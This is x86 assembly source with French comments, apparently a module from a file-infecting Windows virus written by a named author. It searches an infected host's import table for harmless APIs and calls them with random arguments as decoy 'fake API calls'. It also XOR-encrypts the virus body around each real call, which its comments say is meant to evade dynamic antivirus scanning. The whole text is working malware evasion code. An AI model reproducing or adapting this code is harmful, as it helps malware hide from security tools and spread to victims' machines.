   ;;; MODULE : FAKE_APIS
   ;;; AUTEUR : kaze <kaze@lyua.org>
   ;;;
   ;;; Ce module scanne l'import table d'un hote de type PE à la recherche de certaines
   ;;; apis. La liste des apis à chercher est formatée comme dans l'exemple ci-dessous
   ;;; (liste_fake_apis). Cette liste est de la forme:
   ;;;   - nom de la dll (en minuscules)
   ;;;   - couples (crc de l'api, nombre de paramètres de l'api)
   ;;;   - le tout x fois ...
   ;;;  Séparez deux dll par un FAKE_API_SEPARATEUR et terminez la liste par FAKE_API_FIN.
   ;;;
   ;;; Ce module m'a servi à chercher dans l'hote certaines apis "stables", i.e qui ne plantent
   ;;; pas peu importe ce qu'ont leur donne en entrée. Cela permet d'ajouter des "fake api calls"
   ;;; à un décrypteur polymorphique par exemple. D'où le fait qu'il faut renseigner dans la liste
   ;;; le nombre de paramètres de l'api, ca pourra servir plus tard. Ce module peut tout a fait
   ;;; servir à autre chose cependant.
   ;;;
   ;;; La fonction principale à appeler est find_fake_apis qui prend en entrée:
   ;;;   - esi-->liste des crc des fake_apis à chercher formatée comme dans l'exemple
   ;;;   - edi-->tableau qui contiendra la liste des adresses des apis en retour
   ;;;   - edx-->pe header hote
   ;;;   - ebx = adresse où l'hote est filemappé
   ;;;   - ebp = delta offset
   ;;; elle fournit en sortie:
   ;;;   - le tableau passé dans edi est renseigné, et est composé d'une liste de doublons:
   ;;;      .dword : RVA de la future adresse (dans le FirsThunk de l'hote) de l'api.
   ;;;      .dword : nombre de paramètres de l'api
   ;;;   - le nombre d'apis trouvées dans eax
   ;;;Le tableau contient uniquement les futures RVA des adresses des apis QUI ONT ETE TROUVEES
   ;;;dans l'IAT de l'hote. Il ne contiendra donc pas forcément NB_FAKE_APIS doublons mais
   ;;;surement moins. Le tableau est terminé par le dword 0.
   ;;;
   ;;;Il faut bien comprendre que cette fonction ne retourne pas les adresses des apis
   ;;;à l'instant t, mais l'adresse (la RVA exactement) dans le FT de l'hote où sera stockée
   ;;;l'adresse de l'api lorsque l'hote sera exécuté et que l'IAT aura été résolue par le
   ;;;loader windows.
   ;;;
   ;;;NB: faites attention que la tableau passé dans edi soit de taille suffisament grande
   ;;;pour stocker le résultat (taille de (NB_FAKE_APIS+1)*8 octets au max)



   MAX_DYN_FAKE_APIS       EQU 5


   FAKE_API macro crc,nb_params
           dd crc
           db nb_params
   endm

   FAKE_API_SEPARATEUR macro
           dd 0
   endm

   FAKE_API_FIN macro
           dd -1
   endm

   sauve_reg_anti_call     dd ?
   sauve_reg_anti_call2    dd ?



   liste_fake_apis:
           include fake_apis.inc
   NB_FAKE_APIS EQU 500  ; borne max


   ; variables temporaires, merci intel pour si peu de registres !
   ffa_tab     dd ?
   ffa_nb      dd ?
   ffa_tmp1    dd ?

   ;FIND_FAKE_APIS : in : esi-->list des crc des fake_apis possibles
   ;                      edi--> tableau où stocker les adresses des api
   ;                      edx-->pe header hote
   ;                      ebx = file mapping offset
   ;                 out: tableau rempli et eax=nb apis trouvées
   find_fake_apis proc near
           push ecx esi edi

           and [ebp+ffa_nb],dword ptr 0
           mov [ebp+ffa_tab],edi

           mov ecx,NB_FAKE_APIS*2
           xor eax,eax
           rep stosd

           mov eax,[edx+80h]
           call rva2raw
           lea ecx,[eax+ebx]       ;ecx--> IAT de l'hote

   ffa_cherche_iid:
           push ecx
   ffa_cherche_iid_boucle:
           mov eax,[ecx+0Ch]
           test eax,eax
           jz ffa_finrecherche
           call rva2raw
           push esi
           lea edi,[eax+ebx]
   ffa_cmp_str:
           push word ptr [edi]
           cmp [edi],byte ptr 'Z'    ; comparaison du dllname case-insensitive
           ja ffa_minuscule
           cmp [edi],byte ptr 'A'
           jb ffa_minuscule
           add [edi],byte ptr 'a'-'A'
   ffa_minuscule:
           cmpsb
           pop word ptr [edi-1]
           jnz ffa_cmp_faux
           cmp [esi-1],byte ptr 0
           jz ffa_iid_trouve
           jmp ffa_cmp_str
   ffa_cmp_faux:
           pop esi                   ; rerecherche au debut du nom
           add ecx,14h
           jmp ffa_cherche_iid_boucle
   ffa_iid_trouve:
           pop eax                   ; passe à la liste des FAKE_API

   ffa_trouve_api:
           xor eax,eax
           cmp [esi],eax
           jz ffa_fin_iid
           dec eax
           cmp [esi],eax
           jz ffa_finrecherche

           mov eax,[ecx]           ; OFT
           test eax,eax
           jnz ffa_oftpresent
           mov eax,[ecx+10h]
   ffa_oftpresent:
           call rva2raw
           lea edi,[eax+ebx]
           mov [ebp+ffa_tmp1],edi

   ffa_cherche_api:                ; boucle pour chaque api  importee
           mov eax,[edi]
           add edi,4
           test eax,eax
           jz ffa_pas_trouve
           inc eax
           inc eax
           call rva2raw
           add eax,ebx
           test [eax-2],word ptr 8000h
           jnz ffa_cherche_api
           call calc_crc
           cmp eax,[esi]
           jnz ffa_cherche_api
           lea eax,[edi-4]
           sub eax,[ebp+ffa_tmp1]
           add eax,[ecx+10h]       ; eax=pointeur vers la future RVA de l'api
           mov edi,[ebp+ffa_tab]     ;
   ffa_place_libre:
           cmp [edi],dword ptr 0
           jz ffa_libre
           add edi,8
           jmp ffa_place_libre
   ffa_libre:
           stosd
           movzx eax,byte ptr [esi+4]
           stosd
           inc dword ptr [ebp+ffa_nb]
   ffa_pas_trouve:
           add esi,5
           jmp ffa_trouve_api
   ffa_fin_iid:
           add esi,4
           pop ecx
           jmp ffa_cherche_iid
   ffa_finrecherche:
           pop ecx
           pop edi esi ecx
           mov eax,[ebp+ffa_nb]
           ret
   find_fake_apis endp



   anti_call_init proc near
           pusha
           lea esi,[ebp+fa_xor_loop]
           mov edi,[ebp+xor_loop_location]
           mov ecx,XOR_LOOP_SIZE
           rep movsb
           popa
           ret
   anti_call_init endp


   ;ANTI_CALL
   ; in: edx=adresse à appeler
   ;
   ;Appel d'une API au sein du corps du virus :
   ; appel de MAX_DYN_FAKE_APIS fake API
   ; appel de l'API en question
   ; appel de MAX_DYN_FAKE_APIS fake API
   anti_call proc near
           pop ebx
           call appel_fake_apis
           call [ebp+xor_loop_location]
   anti_call_1:
           call edx
           call [ebp+xor_loop_location]
   anti_call_2:
           push eax
           call appel_fake_apis
           pop eax
           inc [ebp+cle_anti_call]
           push ebx
           ret
   anti_call endp


   ;appel_fake_apis
   ; in: none
   ; out:none
   ;appelle MAX_DYN_FAKE_APIS API avec les paramètres qui vont bient
   appel_fake_apis proc near
           pusha
           mov eax,MAX_DYN_FAKE_APIS
           call rand_tuna
           mov ecx,eax
           inc ecx
   cfa_1:
           push ecx
           lea esi,[ebp+sauve_fake_apis]
           call taille_liste
           mov eax,ebx
           shr eax,1
           test eax,eax
           jz cfa_2
           call rand_tuna
           lea esi,[esi+eax*8]
           xor edx,edx
           cmp [esi],edx
           jz cfa_2
           mov eax,[esi+4]
           call rand_pushs
           mov eax,[esi]
           add eax,[ebp+sauve_imagebase]
           call [eax]
   cfa_2:
           pop ecx
           loop cfa_1
           popa
           ret
   appel_fake_apis endp

   rand_pushs proc near    ;in: eax= nb de pushs
           test eax,eax
           jz rp_2
           pop ebx
           mov ecx,eax
   rp_1:   xor eax,eax
           dec eax
           call rand_tuna
           push eax
           loop rp_1
           push ebx
   rp_2:
           ret
   rand_pushs endp

   ; FA_XOR_LOOP
   ; in : none
   ;encrypte le corps du virus pour échapper au scan dynamique
   fa_xor_loop proc near
           pusha
           lea ecx,[ebp+anti_call_1]
           lea esi,[ebp+debut_virus]
           sub ecx,esi
           mov edi,esi
   faxl_1:
           lodsb
           xor al,[ebp+cle_anti_call]
           stosb
           loop faxl_1

           lea ecx,[ebp+fin_dyn_fake_apis]
           lea esi,[ebp+anti_call_2]
           sub ecx,esi
           mov edi,esi
   faxl_2:
           lodsb
           xor al,[ebp+cle_anti_call]
           stosb
           loop faxl_2

           popa
           ret

   fa_xor_loop endp
   XOR_LOOP_SIZE equ $ - offset fa_xor_loop
